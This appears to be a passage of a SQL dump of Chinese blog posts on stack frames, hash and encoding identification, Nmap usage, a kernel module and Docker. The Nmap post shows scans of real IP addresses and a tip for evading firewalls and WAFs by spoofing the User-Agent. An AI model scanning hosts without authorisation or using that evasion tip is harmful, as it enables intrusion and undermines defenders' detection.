\r\n\r\n|------------------|`0xFE0`\r\n\r\n|`0xFF8`=`%rbp`\r\n\r\n|------------------|`0xFD8`=`%rbp`\r\n\r\n|`$3`\r\n\r\n|------------------|`0xFD4`\r\n\r\n|\r\n\r\n|------------------|`0xFD0`=`%rsp`\r\n\r\n\r\n\r\n### `movl	%esi, -8(%rbp)`\r\n\r\n|------------------|`0xFE8`\r\n\r\n|`$rip`  \r\n\r\n|------------------|`0xFE0`\r\n\r\n|`0xFF8`=`%rbp`\r\n\r\n|------------------|`0xFD8`=`%rbp`\r\n\r\n|`$3`\r\n\r\n|------------------|`0xFD4`\r\n\r\n|`$4`\r\n\r\n|------------------|`0xFD0`=`%rsp`\r\n\r\n\r\n\r\n### `movl	-4(%rbp), %eax`\r\n\r\n### `movl	%eax, %edi`\r\n\r\n\r\n\r\n### `call	func`\r\n\r\n|------------------|`0xFE8`\r\n\r\n|`$rip`  \r\n\r\n|------------------|`0xFE0`\r\n\r\n|`0xFF8`=`%rbp`\r\n\r\n|------------------|`0xFD8`=`%rbp`\r\n\r\n|`$3`\r\n\r\n|------------------|`0xFD4`\r\n\r\n|`$4`\r\n\r\n|------------------|`0xFD0`\r\n\r\n|`rip`\r\n\r\n|------------------|`0xFC8`=`%rsp`\r\n\r\n\r\n\r\n### `pushq	%rbp`\r\n\r\n|------------------|`0xFE8`\r\n\r\n|`$rip`  \r\n\r\n|------------------|`0xFE0`\r\n\r\n|`0xFF8`=`%rbp`\r\n\r\n|------------------|`0xFD8`=`%rbp`\r\n\r\n|`$3`\r\n\r\n|------------------|`0xFD4`\r\n\r\n|`$4`\r\n\r\n|------------------|`0xFD0`\r\n\r\n|`rip`\r\n\r\n|------------------|`0xFC8`\r\n\r\n|`0xFD8`=`%rbp`\r\n\r\n|------------------|`0xFC0`=`%rsp`\r\n\r\n\r\n\r\n### `movq	%rsp, %rbp`\r\n\r\n|------------------|`0xFE8`\r\n\r\n|`$rip`  \r\n\r\n|------------------|`0xFE0`\r\n\r\n|`0xFF8`=`%rbp`\r\n\r\n|------------------|`0xFD8`=`%rbp`\r\n\r\n|`$3`\r\n\r\n|------------------|`0xFD4`\r\n\r\n|`$4`\r\n\r\n|------------------|`0xFD0`\r\n\r\n|`rip`\r\n\r\n|------------------|`0xFC8`\r\n\r\n|`0xFD8`=`%rbp`\r\n\r\n|------------------|`0xFC0`=`%rbp`=`%rsp`\r\n\r\n\r\n\r\n### `movl	%edi, -4(%rbp)`\r\n\r\n### `movl	-4(%rbp), %eax`\r\n\r\n\r\n\r\n### `popq	%rbp`\r\n\r\n> `%rbp` = `0xFD8`\r\n\r\n|------------------|`0xFE8`\r\n\r\n|`$rip`  \r\n\r\n|------------------|`0xFE0`\r\n\r\n|`0xFF8`=`%rbp`\r\n\r\n|------------------|`0xFD8`=`%rbp`\r\n\r\n|`$3`\r\n\r\n|------------------|`0xFD4`\r\n\r\n|`$4`\r\n\r\n|------------------|`0xFD0`\r\n\r\n|`rip`\r\n\r\n|------------------|`0xFC8`=`%rsp`\r\n\r\n\r\n\r\n### `ret`\r\n\r\n> `popq	%rip`\r\n>\r\n> `%rip` = `0xFD0 -> 0xFC8` =`*(int64*)(%rsp)`\r\n\r\n|------------------|`0xFE8`\r\n\r\n|`$rip`  \r\n\r\n|------------------|`0xFE0`\r\n\r\n|`0xFF8`=`%rbp`\r\n\r\n|------------------|`0xFD8`=`%rbp`\r\n\r\n|`$3`\r\n\r\n|------------------|`0xFD4`\r\n\r\n|`$4`\r\n\r\n|------------------|`0xFD0`=`%rsp`\r\n\r\n\r\n\r\n### `movl	-8(%rbp), %edx`\r\n\r\n### `addl	%edx, %eax`\r\n\r\n\r\n\r\n### `leave`\r\n\r\n> `movq	%rbp, %rsp` \r\n\r\n|------------------|`0xFE8`\r\n\r\n|`$rip`  \r\n\r\n|------------------|`0xFE0`\r\n\r\n|`0xFF8`=`%rbp`\r\n\r\n|------------------|`0xFD8`=`%rbp`=`%rsp`\r\n\r\n\r\n\r\n> `popq	%rbp`\r\n\r\n|------------------|`0x1000`\r\n\r\n|`%rbp` \r\n\r\n|------------------|`0xFF8`=`%rbp`\r\n\r\n|\r\n\r\n|------------------|`0xFF4`\r\n\r\n|`$4`\r\n\r\n|------------------|`0xFF0`\r\n\r\n|`$3`\r\n\r\n|------------------|`0xFEC`\r\n\r\n|\r\n\r\n|------------------|`0xFE8`\r\n\r\n|`$rip`   \r\n\r\n|------------------|`0xFE0`=`%rsp`\r\n\r\n\r\n\r\n### `ret`\r\n\r\n|------------------|`0x1000`\r\n\r\n|`%rbp` \r\n\r\n|------------------|`0xFF8`=`%rbp`\r\n\r\n|\r\n\r\n|------------------|`0xFF4`\r\n\r\n|`$4`\r\n\r\n|------------------|`0xFF0`\r\n\r\n|`$3`\r\n\r\n|------------------|`0xFEC`\r\n\r\n|\r\n\r\n|------------------|`0xFE8`=`%rsp`\r\n\r\n\r\n\r\n### `movl	%eax, -4(%rbp)`\r\n\r\n|------------------|`0x1000`\r\n\r\n|`%rbp` \r\n\r\n|------------------|`0xFF8`=`%rbp`\r\n\r\n|`$7`\r\n\r\n|------------------|`0xFF4`\r\n\r\n|`$4`\r\n\r\n|------------------|`0xFF0`\r\n\r\n|`$3`\r\n\r\n|------------------|`0xFEC`\r\n\r\n|\r\n\r\n|------------------|`0xFE8`=`%rsp`\r\n\r\n> 这里`0xFEC -> 0xFE8`这块内存没有利用的原因是有些平台（特别是`x86_64`平台）要求栈的对齐。在这些平台上，栈的大小必是16的倍数\r\n\r\n\r\n\r\n### `movl	$0, %eax`\r\n\r\n\r\n\r\n### `leave`\r\n\r\n> `movq	%rbp, %rsp` \r\n\r\n|------------------|`0x1000`\r\n\r\n|`%rbp` \r\n\r\n|------------------|`0xFF8`=`%rbp`=`%rsp`\r\n\r\n\r\n\r\n> `popq	%rbp`\r\n\r\n|------------------|`0x1000`=`%rsp`\r\n\r\n\r\n\r\n### `ret`\r\n\r\n','2024-04-02 15:47:12','2024-04-02 22:10:03'),(100032,100003,'常见加密方式','\r\n\r\n### 1.MD5算法\r\n\r\n示例：`21232F297A57A5A743894A0E4A801FC3` \r\n\r\n一般MD5值是32位由数字“0-9”和字母“a-f”所组成的字符串，如图。如果出现这个范围以外的字符说明这可能是个错误的md5值，就没必要再拿去解密了。16位值是取的是8~24位。\r\n![](https://www.zhuguishihundan.cn/image/17c2ac991b1d1f19.png)\r\n* MD5加密算法特征\r\n* 1.确定性：一个原始数据的MD5值是唯一的，同一个原始数据不可能会计算出多个不同的MD5值。\r\n* 2.碰撞性：原始数据与其MD5值并不是一一对应的，有可能多个原始数据计算出来的MD5值是一样的，这就是碰撞。\r\n* 不可逆：也就是说如果告诉你一个MD5值，你是无法通过它还原出它的原始数据的，这不是你的技术不够牛，这是由它的算法所决定的。一个给定的MD5值是可能对应多个原始数据的，并且理论上讲是可以对应无限多个原始数据，所有无法确定到底是由哪个原始数据产生的\r\n### 2.sha1算法\r\n\r\n示例 ：`d033e22ae348aeb5660fc2140aec35850c4da997`\r\n\r\n这种加密算法与md5类似，只不过位数增加为40位\r\n### 3.NTLM算法\r\n\r\n示例：`209c6174da490caeb422f3fa5a7ae634`\r\n\r\n这种加密是Windows的哈希密码，是 Windows NT 早期版本的标准安全协议。与它相同的还有Domain Cached Credentials（域哈希）。\r\n![](https://www.zhuguishihundan.cn/image/17c2ad00945fe3b5.png)\r\n\r\n### 4. 相似加密类型\r\n\r\n| #    | 算法                      | 长度                                             |\r\n| :--- | :------------------------ | :----------------------------------------------- |\r\n| 1    | md5                       | 32/16                                            |\r\n| 2    | sha1                      | 40                                               |\r\n| 3    | sha256                    | 64                                               |\r\n| 4    | sha512                    | 128                                              |\r\n| 5    | adler32                   | 8                                                |\r\n| 6    | crc32                     | 8                                                |\r\n| 7    | crc32b                    | 8                                                |\r\n| 8    | fnv132                    | 8                                                |\r\n| 9    | fnv164                    | 16                                               |\r\n| 10   | fnv1a32                   | 8                                                |\r\n| 11   | fnv1a64                   | 16                                               |\r\n| 12   | gost                      | 64                                               |\r\n| 13   | gost-crypto               | 64                                               |\r\n| 14   | haval128,3                | 32                                               |\r\n| 15   | haval128,4                | 32                                               |\r\n| 16   | haval128,5                | 32                                               |\r\n| 17   | haval160,3                | 40                                               |\r\n| 18   | haval160,4                | 40                                               |\r\n| 19   | haval160,5                | 40                                               |\r\n| 20   | haval192,3                | 48                                               |\r\n| 21   | haval192,4                | 48                                               |\r\n| 22   | haval192,5                | 48                                               |\r\n| 23   | haval224,3                | 56                                               |\r\n| 24   | haval224,4                | 56                                               |\r\n| 25   | haval224,5                | 56                                               |\r\n| 26   | haval256,3                | 64                                               |\r\n| 27   | haval256,4                | 64                                               |\r\n| 28   | haval256,5                | 64                                               |\r\n| 29   | joaat                     | 8                                                |\r\n| 30   | md2                       | 32                                               |\r\n| 31   | md4                       | 32                                               |\r\n| 32   | ripemd128                 | 32                                               |\r\n| 33   | ripemd160                 | 40                                               |\r\n| 34   | ripemd256                 | 64                                               |\r\n| 35   | ripemd320                 | 80                                               |\r\n| 36   | sha224                    | 56                                               |\r\n| 37   | sha3-224                  | 56                                               |\r\n| 38   | sha3-256                  | 64                                               |\r\n| 39   | sha3-384                  | 96                                               |\r\n| 40   | sha3-512                  | 128                                              |\r\n| 41   | sha384                    | 96                                               |\r\n| 42   | sha512/224                | 56                                               |\r\n| 43   | sha512/256                | 64                                               |\r\n| 44   | snefru                    | 64                                               |\r\n| 45   | snefru256                 | 64                                               |\r\n| 46   | tiger128,3                | 32                                               |\r\n| 47   | tiger128,4                | 32                                               |\r\n| 48   | tiger160,3                | 40                                               |\r\n| 49   | tiger160,4                | 40                                               |\r\n| 50   | tiger192,3                | 48                                               |\r\n| 51   | tiger192,4                | 48                                               |\r\n| 52   | whirlpool                 | 128                                              |\r\n| 53   | mysql                     | 老MYSQL数据库用的，16位，且第1位和第7位必须为0-8 |\r\n| 54   | mysql5                    | 40                                               |\r\n| 55   | NTLM                      | 32                                               |\r\n| 56   | Domain Cached Credentials | 32                                               |\r\n\r\n### 5. Base64加密\r\n\r\n示例：`YWRtaW4tcm9vdA==`\r\n\r\n一般情况下密文尾部都会有两个等号，明文很少的时候则没有\r\n\r\nBase64编码要求把3个8位字节（3*8=24）转化为4个6位的字节（4*6=24），之后在6位的前面补两个0，形成8位一个字节的形式。如果剩下的字符不足3个字节，则用0填充，输出字符使用‘=’，因此编码后输出的文本末尾可能会出现1或2个‘=’。\r\n![](https://www.zhuguishihundan.cn/image/17c2ad081acb7ccb.png)\r\n\r\n为了保证所输出的编码位可读字符，Base64制定了一个编码表，以便进行统一转换。编码表的大小为2^6=64，这也是Base64名称的由来。\r\n\r\nBase64编码表\r\n\r\n| 码值 | 字符 | 码值 | 字符 | 码值 | 字符 | 码值 | 字符 | 码值 | 字符 | 码值 | 字符 | 码值 | 字符 | 码值 | 字符 |\r\n| :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- |\r\n| 0    | A    | 8    | I    | 16   | Q    | 24   | Y    | 32   | g    | 40   | o    | 48   | w    | 56   | 4    |\r\n| 1    | B    | 9    | J    | 17   | R    | 25   | Z    | 33   | h    | 41   | p    | 49   | x    | 57   | 5    |\r\n| 2    | C    | 10   | K    | 18   | S    | 26   | a    | 34   | i    | 42   | q    | 50   | y    | 58   | 6    |\r\n| 3    | D    | 11   | L    | 19   | T    | 27   | b    | 35   | j    | 43   | r    | 51   | z    | 59   | 7    |\r\n| 4    | E    | 12   | M    | 20   | U    | 28   | c    | 36   | k    | 44   | s    | 52   | 0    | 60   | 8    |\r\n| 5    | F    | 13   | N    | 21   | V    | 29   | d    | 37   | l    | 45   | t    | 53   | 1    | 61   | 9    |\r\n| 6    | G    | 14   | O    | 22   | W    | 30   | e    | 38   | m    | 46   | u    | 54   | 2    | 62   | +    |\r\n| 7    | H    | 15   | P    | 23   | X    | 31   | f    | 39   | n    | 47   | v    | 55   | 3    | 63   | /    |\r\n\r\n### 6.Base64使用注意问题\r\n\r\n#### 一、Base64和URL传参问题\r\n\r\n标准的Base64并不适合直接放在URL里传输，因为URL编码器会把标准Base64中的“/”和“+”字符变为形如“%XX”的形式，而这些“%”号在存入[数据库](https://cloud.tencent.com/solution/database?from_column=20065&from=20065)时还需要再进行转换，因为ANSI SQL中已将“%”号用作通配符。\r\n\r\n为解决此问题，可采用一种用于URL的改进Base64编码，它在末尾填充’=\'号，并将标准Base64中的“+”和“/”分别改成了“-”和“_”，这样就免去了在URL编解码和[数据库存储](https://cloud.tencent.com/product/crs?from_column=20065&from=20065)时所要作的转换，避免了编码信息长度在此过程中的增加，并统一了数据库、表单等处对象标识符的格式。\r\n\r\n#### 二、Base64和URL传参问题改善\r\n\r\n另有一种用于正则表达式的改进Base64变种，它将“+”和“/”改成了“!”和“-”，因为“+”,“*”以及前面在IRCu中用到的“[”和“]”在正则表达式中都可能具有特殊含义。\r\n\r\n此外还有一些变种，它们将“+/”改为“*-”或“.*”（用作编程语言中的标识符名称）或“.-”（用于XML中的Nmtoken）甚至“_:”（用于XML中的Name）。\r\n\r\n#### 三、Base64转换后比原有的字符串长1/3\r\n\r\nBase64要求把每三个8Bit的字节转换为四个6Bit的字节（3*8 = 4*6 = 24），然后把6Bit再添两位高位0，组成四个8Bit的字节，也就是说，转换后的字符串理论上将要比原来的长1/3。\r\n\r\n#### 四、Base64转换总结\r\n\r\nBase64转换，最好是不要用在加密上，尤其是参数加密，很容易出问题。\r\n\r\n### 7.Unicode、HTML实体编码、16进制Unicode\r\n\r\n#### 1、Unicode——汉字示例`这`、字母示例`t`、数字符号示例`5`\r\n\r\n可以说Unicode与HTML实体编码是一个东西\r\n\r\nUnicode（统一码、万国码、单一码）是一种在计算机上使用的字符编码。Unicode 是为了解决传统的字符编码方案的局限而产生的，它为每种语言中的每个字符设定了统一并且唯一的二进制编码，以满足跨语言、跨平台进行文本转换、处理的要求。1990年开始研发，1994年正式公布。\r\n![](https://www.zhuguishihundan.cn/image/17c2ad19e7435cb9.png)\r\n\r\n#### 2、HTML实体编码——示例与Unicode相同\r\n\r\n字符实体是用一个编号写入HTML代码中来代替一个字符，在使用浏览器访问网页时会将这个编号解析还原为字符以供阅读。\r\n\r\n这么做的目的主要有两个： \r\n\r\n* １、解决HTML代码编写中的一些问题。例如需要在网页上显示小于号（<）和大于号（>），由于它们是HTML的预留标签，可能会被误解析。这时就需要将小于号和大于号写成字符实体： 小于号这样写：< 或 < 大于号这样写：> 或 > 前面的写法称为实体名称，后面的写法则是实体编号。ISO-8859-1字符集（西欧语言）中两百多个字符设定了实体名称，而对于其它所有字符都可以用实体编号来代替。 *\r\n* 2、网页编码采用了特定语言的编码，却需要显示来自其它语言的字符。例如，网页编码采用了西欧语言ISO-8859-1，却要在网页中显示中文，这时必须将中文字符以实体形式写入HTML代码中。\r\n![](https://www.zhuguishihundan.cn/image/17c2ad22c3c329a5.png)\r\n\r\n\r\n#### 3、16进制Unicode——示例`\\u8fd9\\u662f\\u4e00`\r\n\r\n![](https://www.zhuguishihundan.cn/image/17c2ad28b967bbad.png)\r\n\r\n\r\n### 8.URL、Hex编码\r\n\r\n这两种加密的密文是一样的，不同的是当你用url编码网站时是不会把http进行编码的，而Hex编码则全部转化了\r\n\r\nencodeURIComponent() 函数 与 encodeURI() 函数的区别 请注意 encodeURIComponent() 函数 与 encodeURI() 函数的区别之处，前者假定它的参数是 URI 的一部分（比如协议、主机名、路径或查询字符串）。因此 encodeURIComponent() 函数将转义用于分隔 URI 各个部分的标点符号。\r\n\r\n![](https://www.zhuguishihundan.cn/image/17c2ad33a8ff7885.png)\r\n\r\n\r\n![](https://www.zhuguishihundan.cn/image/17c2ad376ab25205.png)\r\n\r\n\r\n### 9.js专用加密\r\n\r\n#### 1.颜文字js加密\r\n\r\n特征：一堆颜文字构成的js代码，在F12中可直接解密执行\r\n\r\n![](https://www.zhuguishihundan.cn/image/17c2ad47cf8c8c3a.png)\r\n\r\n\r\n#### 2.jother编码\r\n\r\n特征：只用`! + ( ) [ ] { }`这八个字符就能完成对任意字符串的编码。也可在F12中解密执行\r\n\r\n![](https://www.zhuguishihundan.cn/image/17c2ad4c914432e7.png)\r\n\r\n\r\n#### 3.JSFuck编码\r\n\r\n特征：与jother很像，只是少了`{ }`\r\n\r\n![](https://www.zhuguishihundan.cn/image/17c2ad51cd2307a0.png)\r\n\r\n','2024-04-03 13:08:22','2024-04-03 13:16:23'),(100033,100003,'Nmap使用详解','# Nmap使用用法\r\n\r\n#### 1.Nmap简介\r\n\r\n**Nmap(Network Mapper,网络映射器)是一款开放源代码的网络探测和安全审核的工具。**\r\n\r\nNmap所识别的6个端口状态。\r\n\r\n- open(开放的)\r\n\r\n  应用程序正在该端口接收TCP 连接或者UDP报文。发现这一点常常是端口扫描 的主要目标。安全意识强的人们知道每个开放的端口 都是攻击的入口。攻击者或者入侵测试者想要发现开放的端口。 而管理员则试图关闭它们或者用防火墙保护它们以免妨碍了合法用户。 非安全扫描可能对开放的端口也感兴趣，因为它们显示了网络上那些服务可供使用。\r\n\r\n- closed(关闭的)\r\n\r\n  关闭的端口对于Nmap也是可访问的(它接受Nmap的探测报文并作出响应)， 但没有应用程序在其上监听。 它们可以显示该IP地址上(主机发现，或者ping扫描)的主机正在运行up 也对部分操作系统探测有所帮助。 因为关闭的关口是可访问的，也许过会儿值得再扫描一下，可能一些又开放了。 系统管理员可能会考虑用防火墙封锁这样的端口。 那样他们就会被显示为被过滤的状态，下面讨论。\r\n\r\n- filtered(被过滤的)\r\n\r\n  由于包过滤阻止探测报文到达端口， Nmap无法确定该端口是否开放。过滤可能来自专业的防火墙设备，路由器规则 或者主机上的软件防火墙。这样的端口让攻击者感觉很挫折，因为它们几乎不提供 任何信息。有时候它们响应ICMP错误消息如类型3代码13 (无法到达目标: 通信被管理员禁止)，但更普遍的是过滤器只是丢弃探测帧， 不做任何响应。 这迫使Nmap重试若干次以访万一探测包是由于网络阻塞丢弃的。 这使得扫描速度明显变慢。\r\n\r\n- unfiltered(未被过滤的)\r\n\r\n  未被过滤状态意味着端口可访问，但Nmap不能确定它是开放还是关闭。 只有用于映射防火墙规则集的ACK扫描才会把端口分类到这种状态。 用其它类型的扫描如窗口扫描，SYN扫描，或者FIN扫描来扫描未被过滤的端口可以帮助确定 端口是否开放。\r\n\r\n- open|filtered(开放或者被过滤的)\r\n\r\n  当无法确定端口是开放还是被过滤的，Nmap就把该端口划分成 这种状态。开放的端口不响应就是一个例子。没有响应也可能意味着报文过滤器丢弃 了探测报文或者它引发的任何响应。因此Nmap无法确定该端口是开放的还是被过滤的。 UDP，IP协议， FIN，Null，和Xmas扫描可能把端口归入此类。\r\n\r\n- closed|filtered(关闭或者被过滤的)\r\n\r\n  该状态用于Nmap不能确定端口是关闭的还是被过滤的。 它只可能出现在IPID Idle扫描中。\r\n\r\n**以下是最常用的的命令组合方式。**\r\n\r\n```\r\nsudo nmap -v -sS -p8000-9000 -Pn T4 -A 110.242.68.66 --script http-methods --script-args http.useraget=\"Mozilla/5.0\" Gecko/20100101 Firefox/87.0\r\n```\r\n\r\n#### 2.-v实时输出扫描详情\r\n\r\n```\r\n┌──(cpt?localhost)-[~]\r\n└─$ sudo nmap -v 39.156.66.10                                       ##可以实时观看运行时完成速率\r\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-13 16:33 CST\r\nInitiating Ping Scan at 16:33\r\nScanning 39.156.66.10 [4 ports]\r\nCompleted Ping Scan at 16:33, 0.01s elapsed (1 total hosts)\r\nInitiating Parallel DNS resolution of 1 host. at 16:33\r\nCompleted Parallel DNS resolution of 1 host. at 16:33, 0.02s elapsed\r\nInitiating SYN Stealth Scan at 16:33\r\nScanning 39.156.66.10 [1000 ports]\r\nDiscovered open port 80/tcp on 39.156.66.10\r\nDiscovered open port 443/tcp on 39.156.66.10\r\nIncreasing send delay for 39.156.66.10 from 0 to 5 due to 11 out of 14 dropped probes since last increase.\r\nIncreasing send delay for 39.156.66.10 from 5 to 10 due to 11 out of 11 dropped probes since last increase.\r\nIncreasing send delay for 39.156.66.10 from 10 to 20 due to 11 out of 11 dropped probes since last increase.\r\nCompleted SYN Stealth Scan at 16:33, 49.25s elapsed (1000 total ports)\r\nNmap scan report for 39.156.66.10\r\nHost is up (0.0083s latency).\r\nNot shown: 998 filtered tcp ports (no-response)\r\nPORT    STATE SERVICE\r\n80/tcp  open  http\r\n443/tcp open  https\r\n\r\nRead data files from: /usr/bin/../share/nmap\r\nNmap done: 1 IP address (1 host up) scanned in 49.36 seconds\r\n           Raw packets sent: 2039 (89.544KB) | Rcvd: 1007 (40.288KB)\r\n\r\n```\r\n\r\n#### 3.-A全面扫描\r\n\r\n```\r\n┌──(cpt㉿localhost)-[~]\r\n└─$ nmap -A 124.71.166.50                                   # nmap -A 124.222.8.1/24扫描c段存活端口\r\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-13 16:42 CST\r\nNmap scan report for ecs-124-71-166-50.compute.hwclouds-dns.com (124.71.166.50)\r\nHost is up (0.047s latency).\r\nNot shown: 997 filtered tcp ports (no-response)\r\nPORT    STATE SERVICE  VERSION\r\n22/tcp  open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)\r\n| ssh-hostkey: \r\n|   3072 fc:33:23:11:9f:ad:cb:b2:de:14:57:82:92:9b:c8:46 (RSA)\r\n|   256 17:5b:2a:67:e4:17:a8:6e:ef:af:2e:13:0e:da:9b:5c (ECDSA)\r\n|_  256 2d:db:74:d1:c3:f3:c6:38:97:4d:46:2f:d9:7a:8d:76 (ED25519)\r\n80/tcp  open  http     nginx 1.25.3\r\n|_http-title: Did not follow redirect to https://ecs-124-71-166-50.compute.hwclouds-dns.com/\r\n|_http-server-header: nginx/1.25.3\r\n443/tcp open  ssl/http nginx 1.25.3\r\n|_ssl-date: TLS randomness does not represent time\r\n|_http-server-header: nginx/1.25.3\r\n|_http-title: \\xE6\\x88\\x91\\xE4\\xB8\\x8D\\xE5\\x90\\x83\\xE7\\x89\\x9B\\xE8\\x82\\x89\r\n| ssl-cert: Subject: commonName=zhuguishihundan.cn\r\n| Subject Alternative Name: DNS:www.zhuguishihundan.cn, DNS:zhuguishihundan.cn\r\n| Not valid before: 2024-02-19T12:12:00\r\n|_Not valid after:  2024-05-19T12:11:59\r\n| tls-alpn: \r\n|   http/1.1\r\n|   http/1.0\r\n|_  http/0.9\r\n| http-robots.txt: 2 disallowed entries \r\n|_/api/ /admin/\r\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\r\n\r\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\r\nNmap done: 1 IP address (1 host up) scanned in 300.63 seconds\r\n\r\n```\r\n\r\n#### 4.-Pn 禁ping扫描，扫描前不ping(默认情况下Nmap会ping目标地址)\r\n\r\n```\r\n┌──(cpt㉿localhost)-[~]\r\n└─$ nmap -Pn 124.71.166.50\r\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-13 17:02 CST\r\nNmap scan report for ecs-124-71-166-50.compute.hwclouds-dns.com (124.71.166.50)\r\nHost is up (0.042s latency).\r\nNot shown: 997 filtered tcp ports (no-response)\r\nPORT    STATE SERVICE\r\n22/tcp  open  ssh\r\n80/tcp  open  http\r\n443/tcp open  https\r\n\r\nNmap done: 1 IP address (1 host up) scanned in 425.97 seconds\r\n\r\n```\r\n\r\n#### 5.-p指定端口\r\n\r\n```\r\n┌──(cpt㉿localhost)-[~]                              #nmap -p8000-9000 124.71.166.50也可扫描端口段\r\n└─$ nmap -p22 124.71.166.50\r\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-13 17:16 CST\r\nNmap scan report for ecs-124-71-166-50.compute.hwclouds-dns.com (124.71.166.50)\r\nHost is up (0.092s latency).\r\n\r\nPORT   STATE SERVICE\r\n22/tcp open  ssh\r\n\r\n```\r\n\r\n#### 6.-sP ping探测主机存活，不扫描端口\r\n\r\n```\r\n┌──(cpt㉿localhost)-[~]\r\n└─$ nmap -sP 124.71.166.50 \r\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-13 17:29 CST\r\nNmap scan report for ecs-124-71-166-50.compute.hwclouds-dns.com (124.71.166.50)\r\nHost is up (0.054s latency).\r\nNmap done: 1 IP address (1 host up) scanned in 0.09 seconds\r\n\r\n```\r\n\r\n#### 7. -sS syn扫描/半开放扫描，准确率低\r\n\r\n```\r\n                                                                                                                                                                                           \r\n┌──(cpt㉿localhost)-[~]\r\n└─$ nmap -sS 124.71.166.50\r\nYou requested a scan type which requires root privileges.\r\nQUITTING!\r\n\r\n```\r\n\r\n#### 8.-sT 连接扫描，准确率高\r\n\r\n```\r\n┌──(cpt㉿localhost)-[~]\r\n└─$ nmap -sT 124.71.166.50\r\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-13 18:27 CST\r\nNmap scan report for ecs-124-71-166-50.compute.hwclouds-dns.com (124.71.166.50)\r\nHost is up (0.0053s latency).\r\nNot shown: 996 closed tcp ports (conn-refused)\r\nPORT    STATE    SERVICE\r\n22/tcp  open     ssh\r\n80/tcp  open     http\r\n443/tcp open     https\r\n514/tcp filtered shell\r\n\r\nNmap done: 1 IP address (1 host up) scanned in 1.39 seconds\r\n\r\n```\r\n\r\n#### 9.-T代表速率，0-5级，数值越高速率越快\r\n\r\n```\r\n┌──(cpt㉿localhost)-[~]\r\n└─$ nmap -T3 124.71.166.50\r\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-13 19:45 CST\r\nNmap scan report for ecs-124-71-166-50.compute.hwclouds-dns.com (124.71.166.50)\r\nHost is up (0.045s latency).\r\nNot shown: 997 filtered tcp ports (no-response)\r\nPORT    STATE SERVICE\r\n22/tcp  open  ssh\r\n80/tcp  open  http\r\n443/tcp open  https\r\n\r\nNmap done: 1 IP address (1 host up) scanned in 309.82 seconds\r\n                                                               \r\n```\r\n\r\n#### 10.绕过防火墙或waf\r\n\r\n**绕过防火墙/安全设备**\r\n\r\nNmap使用默认User-Agent，流量和日志里一览无遗（秃子头上的虱子），不封你封谁。大部分工具默认指纹都已被提取规则，使用的时候注意看下源码或者测试一下。\r\n\r\n扫描时指定`User-Agent`，可以绕过部分安全检测\r\n\r\n```bash\r\nnmap -A -v -p80 124.*.8.254 --script http-methods --script-args http.useragent=\"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:87.0) Gecko/20100101 Firefox/87.0\"\r\n```\r\n\r\n\r\n\r\n**结果写入文件**\r\n\r\n原始结果\r\n\r\n```bash\r\nnmap -A -v -p80 -T4 124.*.8.254 -o 4.txt\r\n```\r\n\r\n\r\n\r\n保存为XML格式\r\n\r\n```bash\r\nnmap -A -v -p80 -T4 124.*.8.254 -oX 4.xml\r\n```\r\n\r\n','2024-04-13 21:39:43','2024-04-13 21:39:43'),(100035,100000,'linux内核模块','## 编写一个简单的linux内核模块\r\n\r\n编写`hello.c`源文件\r\n\r\n```c\r\n#include <linux/module.h>\r\n#include <linux/kernel.h>\r\n#include <linux/init.h>\r\n\r\nstatic int __init hello_init(void)\r\n{\r\n	printk(KERN_INFO \"Hello, world!\\n\");\r\n	return 0;\r\n}\r\n\r\nstatic void __exit hello_exit(void)\r\n{\r\n	printk(KERN_INFO \"Goodbye, world!\\n\");\r\n}\r\n\r\nmodule_init(hello_init);\r\nmodule_exit(hello_exit);\r\n\r\nMODULE_LICENSE(\"GPL\");\r\nMODULE_AUTHOR(\"Yangming He <yangminghe20@gmail.com>\");\r\nMODULE_DESCRIPTION(\"A sample driver\");\r\n```\r\n\r\n编写`Makefile`文件\r\n\r\n```makefile\r\nobj-m := hello.o\r\nall:\r\n	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules\r\nclean:\r\n	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean\r\n```\r\n\r\n编译\r\n\r\n```sh\r\n$ make\r\n```\r\n\r\n将模块加载进内核\r\n\r\n```sh\r\n$ sudo insmod hello.ko\r\n```\r\n\r\n查看内核日志\r\n\r\n```sh\r\n$ sudo dmesg\r\n```\r\n\r\n卸载模块\r\n\r\n```sh\r\n$ sudo rmmod\r\n```\r\n\r\n再次查看内核日志\r\n\r\n```sh\r\n$ sudo dmesg\r\n```\r\n\r\n或者在`Makefile`添加自动化测试\r\n\r\n```makefile\r\ntest:\r\n	sudo dmesg -C\r\n	sudo insmod hello.ko\r\n	sudo rmmod hello.ko\r\n	sudo dmesg\r\n```\r\n\r\n运行测试\r\n\r\n```sh\r\n$ make test\r\n```\r\n\r\n','2024-04-16 14:43:41','2024-04-16 15:42:57'),(100039,100008,'Docker使用手册','![](https://cdn.jsdelivr.net/gh/Markydh/MyPicture@img/img/Docker.jpg)\r\n\r\n\r\n\r\n#  Docker 使用手册\r\n\r\n# 1.拉取Docker镜像\r\n\r\n## 1.1 搜索镜像\r\n\r\n直接命令行搜索 \r\n\r\n```cmd\r\ndocker search `<images>`\r\n```\r\n\r\n![Screenshot 2024-04-19 at 10.53.36](https://cdn.jsdelivr.net/gh/Markydh/MyPicture@img/img/Screenshot%202024-04-19%20at%2010.53.36.png)\r\n\r\n或者去Docker Hub搜索镜像\r\n\r\n## 1.2 拉取docker镜像\r\n\r\n```\r\ndocker pull `<image>`:<版本号> \r\n```\r\n\r\n> [!TIP]\r\n>\r\n> 版本号默认是latest\r\n\r\n# 2.列出镜像 \r\n\r\n## 2.1 查看docker 镜像\r\n\r\n```\r\ndocker images / docker image ls /docke image list\r\n```\r\n\r\n![Screenshot 2024-04-19 at 